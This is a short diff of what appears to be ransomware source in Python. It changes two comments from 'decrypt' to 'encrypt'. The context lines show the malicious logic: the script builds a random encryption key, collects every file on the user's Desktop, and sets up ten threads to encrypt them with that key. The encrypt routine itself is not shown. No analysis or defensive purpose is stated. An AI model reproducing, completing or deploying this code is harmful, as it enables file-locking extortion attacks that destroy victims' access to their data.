@@ -42,7 +42,7 @@ ENCRYPTION_LEVEL=512 // 8 #512 bit encryption =64 bytes
 key_char_pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|"
 key_char_pool_len =len(key_char_pool)
 
-#Grab filepaths to decrypt
+#Grab filepaths to encrypt
 print("preparing files....")
 desktop_path =os.environ['USERPROFILE']+'\\Desktop'
 files =os.listdir(desktop_path)
@@ -75,7 +75,7 @@ q=queue.Queue()
 for f in abs_file:
     q.put(f)
 
-#Setup threads to get ready for decryption
+#Setup threads to get ready for encryption
 for i in range(10):
     t=threading.Thread(target=encrypt, args=(key,),daemon=True)
     t.start()
